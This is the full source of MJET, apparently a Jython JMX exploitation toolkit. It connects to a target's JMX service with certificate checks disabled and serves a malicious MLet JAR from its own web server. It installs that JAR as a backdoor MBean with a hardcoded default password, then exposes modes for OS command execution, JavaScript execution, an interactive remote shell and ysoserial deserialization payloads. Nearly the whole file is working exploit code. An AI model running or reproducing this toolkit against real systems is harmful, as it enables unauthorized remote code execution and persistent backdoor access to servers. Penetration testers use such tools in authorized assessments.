# jmx stuff
from javax.management.remote import JMXServiceURL
from javax.management.remote import JMXConnector
from javax.management.remote import JMXConnectorFactory
from javax.management import ObjectName
from java.lang import String
from java.lang import Object
from jarray import array
from java.io import IOException
from javax.net.ssl import TrustManager, X509TrustManager
from javax.net.ssl import SSLContext
# BaseHTTPServer needed to serve mlets
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from threading import Thread

import sys
import time
import jarray
from jarray import array



# Extra
import argparse
import base64
import random
import string


authorSignature =  'MJET - MOGWAI LABS JMX Exploitation Toolkit\n'
authorSignature += '==========================================='

class TrustAllX509TrustManager(X509TrustManager):
    def checkClientTrusted(self, chain, auth):
        pass

    def checkServerTrusted(self,chain,auth):
        pass

    def getAcceptedIssuers(self):
        return None


### AUX ###
def connectToJMX(args):
    # Basic JMX connection, always required
    trust_managers = array([TrustAllX509TrustManager()], TrustManager)

    sc = SSLContext.getInstance("SSL")
    sc.init(None, trust_managers, None)
    SSLContext.setDefault(sc)
    jmx_url = JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args.targetHost + ":" + args.targetPort + "/jmxrmi")

    print "[+] Connecting to: " + str(jmx_url)
    try:
        # for passing credentials for password
        if args.jmxpassword and args.jmxrole:
            print ("[+] Using credentials: " + str(args.jmxrole) + " / " + str(args.jmxpassword))
            credentials = array([args.jmxrole,args.jmxpassword],String)
            environment = {JMXConnector.CREDENTIALS:credentials}
            jmx_connector = JMXConnectorFactory.connect(jmx_url, environment)
        else:
            jmx_connector = JMXConnectorFactory.connect(jmx_url)

        print "[+] Connected: " + str(jmx_connector.getConnectionId())
        bean_server = jmx_connector.getMBeanServerConnection()
        return bean_server
    except IOException:
        print "[-] Error: Can't connect to remote service"
        sys.exit(-1)
##########

### WEBSERVER MODE ###
def webserverMode(args):
    startWebserver(args)
    raw_input("[+] Press Enter to stop the service\n")

### /WEBSERVER MODE ###

### INSTALL MODE ###

def installMode(args):
    startWebserver(args)
    bean_server = connectToJMX(args)
    installMBean(args, bean_server)
    print "[+] Done"

def installMBean(args, bean_server):
    # Installation, load javax.management.loading.MLet to install additional MBeans
    # If loading fails, the Mlet is already loaded...
    try:
        mlet_bean = bean_server.createMBean("javax.management.loading.MLet", None)
    except:
        # MLet Bean can't be created because it already exists
        mlet_bean = bean_server.getObjectInstance(ObjectName("DefaultDomain:type=MLet"))

    print "[+] Loaded " + str(mlet_bean.getClassName())


    # Install payload Mlet via getMbeansFromURL
    # pass the URL of the web server
    print "[+] Loading malicious MBean from " + args.payload_url
    print "[+] Invoking: "+ mlet_bean.getClassName() + ".getMBeansFromURL"


    inv_array1 = jarray.zeros(1, Object)
    inv_array1[0] = args.payload_url

    inv_array2 = jarray.zeros(1, String)
    inv_array2[0] = String.canonicalName

    resource = bean_server.invoke(mlet_bean.getObjectName(), "getMBeansFromURL", inv_array1, inv_array2)

    # Check if the Mlet was loaded successfully

    for res in resource:
        if res.__class__.__name__ == "InstanceAlreadyExistsException":
            print "[+] Object instance already existed, no need to install it a second time"
        elif res.__class__.__name__ == "ObjectInstance":
            print "[+] Successfully loaded MBean" + str(res.getObjectName())

            # Change the password from "I+n33d+a+glass+0f+watta" to the new value
            print "[+] Changing default password..."
            changePassword("I+n33d+a+glass+0f+watta", args.password, bean_server)
        else:
            print res



def startWebserver(args):
    # Start a web server on all ports in a seperate thread
    # Only needed during installation
    print "[+] Starting webserver at port " + str(args.payload_port)
    mletHandler = MakeHandlerClass(args.payload_url)
    mlet_webserver = HTTPServer(('', int(args.payload_port)), mletHandler)
    webserver_thread = Thread(target = mlet_webserver.serve_forever)
    webserver_thread.daemon = True
    try:
        webserver_thread.start()
    except KeyboardInterrupt:
        mlet_webserver.shutdown()
        sys.exit(0)

def MakeHandlerClass(base_url):
    #This class will handles any incoming request from
    #the JMX service
    # Needed during installation of the JAR
    class CustomHandler(BaseHTTPRequestHandler):


        def __init__(self, *args, **kwargs):
             self._base_url = base_url
             self.jar_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(8)) + '.jar'
             BaseHTTPRequestHandler.__init__(self, *args, **kwargs)

        #Handler for the GET requests
        def do_GET(self):
            if self.path=="/":
                mlet_code = '<html><mlet code="de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload" archive="' + self.jar_name + '" name="MogwaiLabs:name=payload,id=1" codebase="' + self._base_url + '"></mlet></html>'

                self.send_response(200)
                self.send_header('Pragma', 'no-cache')
                self.end_headers()
                self.wfile.write(mlet_code)

            elif self.path.endswith('.jar'):
                f = open("./payloads/MogwaiLabsMJET-MLet.jar")
                self.send_response(200)
                self.send_header('Content-type', 'application/jar')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()

            else:
                self.send_error(404, 'File not found: ' + self.path)
                #
                # except IOError:
                #   self.send_error(404,'File Not Found: %s' % self.path)

    return CustomHandler

### /INSTALL MODE ###


### UNINSTALL MODE ###
def uninstallMode(args):
    bean_server = connectToJMX(args)
    uninstallMBeans(bean_server)
    print "[+] Done"

def uninstallMBeans(bean_server):
    try:
        bean_server.unregisterMBean(ObjectName("MogwaiLabs:name=payload,id=1"))
    except:
        print "[-] Error: The MBean is not registered in the target server"
        sys.exit(0)
    print "[+] MBean correctly uninstalled"

### /UNINSTALL MODE ###


### CHANGE PASSWORD MODE ###

def changePasswordMode(args):
    bean_server = connectToJMX(args)
    changePassword(args.password, args.newpass, bean_server)
    print "[+] Done"

def changePassword(password, newpass, bean_server):
    # Payload execution
    # Load the Payload Met and invoke a method on it
    mlet_bean = bean_server.getObjectInstance(ObjectName("MogwaiLabs:name=payload,id=1"))
    print "[+] Loaded " + str(mlet_bean.getClassName())

    inv_array1 = jarray.zeros(2, Object)
    inv_array1[0] = password
    inv_array1[1] = newpass

    inv_array2 = jarray.zeros(2, String)
    inv_array2[0] = String.canonicalName
    inv_array2[1] = String.canonicalName

    resource = bean_server.invoke(mlet_bean.getObjectName(), "changePassword", inv_array1, inv_array2)

    if str(resource) == "True":
        print "[+] Successfully changed password"
    else:
        print "[-] Unable to change password"

    sys.stdout.flush()

### /CHANGE PASSWORD MODE ###


### COMMAND MODE ###

def commandMode(args):
    bean_server = connectToJMX(args)
    executeCommand(args.password, args.cmd, bean_server)
    print "[+] Done"

def executeCommand(password, cmd, bean_server):
    # Payload execution
    # Load the Payload MLet and invoke a method on it
    mlet_bean = bean_server.getObjectInstance(ObjectName("MogwaiLabs:name=payload,id=1"))
    print "[+] Loaded " + str(mlet_bean.getClassName())

    print "[+] Executing command: " + cmd
    inv_array1 = jarray.zeros(2, Object)
    inv_array1[0] = password
    inv_array1[1] = cmd


    inv_array2 = jarray.zeros(2, String)
    inv_array2[0] = String.canonicalName
    inv_array2[1] = String.canonicalName

    resource = bean_server.invoke(mlet_bean.getObjectName(), "runCMD", inv_array1, inv_array2)

    print resource

    sys.stdout.write("\n")
    sys.stdout.flush()

### /COMMAND MODE ###

### JAVASCRIPT MODE ###

def scriptMode(args):
    bean_server = connectToJMX(args)

    with open(args.filename, 'r') as myfile:
        script=myfile.read()

    executeJS(args.password, script, bean_server)
    print "[+] Done"

def executeJS(password, js, bean_server):
    # Payload execution
    # Load the Payload MLet and invoke a method on it
    mlet_bean = bean_server.getObjectInstance(ObjectName("MogwaiLabs:name=payload,id=1"))
    print "[+] Loaded " + str(mlet_bean.getClassName())

    print "[+] Executing script"
    inv_array1 = jarray.zeros(2, Object)
    inv_array1[0] = password
    inv_array1[1] = js

    inv_array2 = jarray.zeros(2, String)
    inv_array2[0] = String.canonicalName
    inv_array2[1] = String.canonicalName

    resource = bean_server.invoke(mlet_bean.getObjectName(), "runJS", inv_array1, inv_array2)

    if resource is not None:
        print resource

    sys.stdout.write("\n")
    sys.stdout.flush()

### /JAVASCRIPT MODE ###


### SHELL MODE ###

def shellMode(args):
    bean_server = connectToJMX(args)
    startShell(args.password, bean_server)
    print "[+] Done"

def startShell(password, bean_server):
    print "[+] Use command 'exit_shell' to exit the shell"
    in_command_loop = True
    while in_command_loop:
        cmd = raw_input(">>> ")
        if cmd == 'exit_shell':
            in_command_loop = False
        else:
            executeCommand(password, cmd, bean_server)

### /SHELL MODE ###

### DESERIALIZATION MODE ###

def deserializationMode(args):
    bean_server = connectToJMX(args)
    deployObject(args.gadget, args.cmd, bean_server)
    print "[+] Done"

def deployObject(gadget, cmd, bean_server):
    # Command execution
    # Load default MLet java.util.logging and invoke method getLoggerLevel on it
    mlet_bean = bean_server.getObjectInstance(ObjectName("java.util.logging:type=Logging"))
    print "[+] Loaded " + str(mlet_bean.getClassName())
    
    try:
        # Load the ysoserial.jar file
        sys.path.append("./ysoserial.jar")
    except:
        print "[-] Error: Did not find ysoserial.jar in MogwaiLabsMJet folder"
        sys.exit(0)
    print "[+] Added ysoserial API capacities"
    
    from ysoserial.payloads.ObjectPayload import Utils
   
    # Generate deserialization object with ysoserial.jar
    payload_object = Utils.makePayloadObject(gadget, cmd)
    
    print "[+] Deploying object"
    inv_array1 = jarray.zeros(1, Object)
    inv_array1[0] = payload_object

    inv_array2 = jarray.zeros(1, String)
    inv_array2[0] = String.canonicalName

    resource = bean_server.invoke(mlet_bean.getObjectName(), "getLoggerLevel", inv_array1, inv_array2)

    print resource

    sys.stdout.write("\n")
    sys.stdout.flush()


### /DESERIALIZATION MODE ###

### PARSER ###
# Map for clarity's sake
def arg_install_mode(args):
    installMode(args)
def arg_command_mode(args):
    commandMode(args)
def arg_script_mode(args):
    scriptMode(args)
def arg_shell_mode(args):
    shellMode(args)
def arg_password_mode(args):
    changePasswordMode(args)
def arg_uninstall_mode(args):
    uninstallMode(args)
def arg_webserver_mode(args):
    webserverMode(args)
def arg_deserialization_mode(args):
    deserializationMode(args)

# print header
print ""
print authorSignature

# Base parser
parser = argparse.ArgumentParser(description = 'MJET allows an easy exploitation of insecure JMX services', epilog='--- MJET - MOGWAI LABS JMX Exploitation Toolkit ------------------', add_help=True)
parser.add_argument('targetHost', help='target IP address')
parser.add_argument('targetPort', help='target JMX service port')
parser.add_argument('--jmxrole', help='remote JMX role')
parser.add_argument('--jmxpassword', help='remote JMX password')
subparsers = parser.add_subparsers(title='modes', description='valid modes', help='use ... MODE -h for help about specific modes')

# Install mode
install_subparser = subparsers.add_parser('install', help='install the payload MBean on the target')
install_subparser.add_argument('password', help="the password that should be set after successful installation")
install_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
install_subparser.add_argument('payload_port', help='port to load the payload')
install_subparser.set_defaults(func=arg_install_mode)

# Uninstall mode
uninstall_subparser = subparsers.add_parser('uninstall', help='uninstall the payload MBean from the target')
uninstall_subparser.set_defaults(func=arg_uninstall_mode)

# Password mode
password_subparser = subparsers.add_parser('changepw', help='change the payload password on the target')
password_subparser.add_argument('password', help="the password to access the installed MBean")
password_subparser.add_argument('newpass', help='The new password')
password_subparser.set_defaults(func=arg_password_mode)

# Command mode
command_subparser = subparsers.add_parser('command', help='execute a command in the target')
command_subparser.add_argument('password', help="the password to access the installed MBean")
command_subparser.add_argument('cmd', help='command to be executed')
command_subparser.set_defaults(func=arg_command_mode)

# Javascript mode
script_subparser = subparsers.add_parser('javascript', help='execute JavaScript code from a file in the target')
script_subparser.add_argument('password', help="the password to access the installed MBean")
script_subparser.add_argument('filename', help='file with the JavaScript code to be executed')
script_subparser.set_defaults(func=arg_script_mode)

# Shell mode
shell_subparser = subparsers.add_parser('shell', help='open a simple command shell in the target')
shell_subparser.add_argument('password', help="the required password to access the installed MBean")
shell_subparser.set_defaults(func=arg_shell_mode)

# Webserver mode
webserver_subparser = subparsers.add_parser('webserver', help='just run the MLET web server')
webserver_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
webserver_subparser.add_argument('payload_port', help='port to load the system')
webserver_subparser.set_defaults(func=arg_webserver_mode)


# Deserialization mode
deserialize_subparser = subparsers.add_parser('deserialize', help='send a ysoserial payload to the target')
deserialize_subparser.add_argument('gadget', help='gadget as provided by ysoserial, e.g., CommonsCollections6')
deserialize_subparser.add_argument('cmd', help='command to be executed')
deserialize_subparser.set_defaults(func=arg_deserialization_mode)

# Store the user args
args = parser.parse_args()
args.func(args)
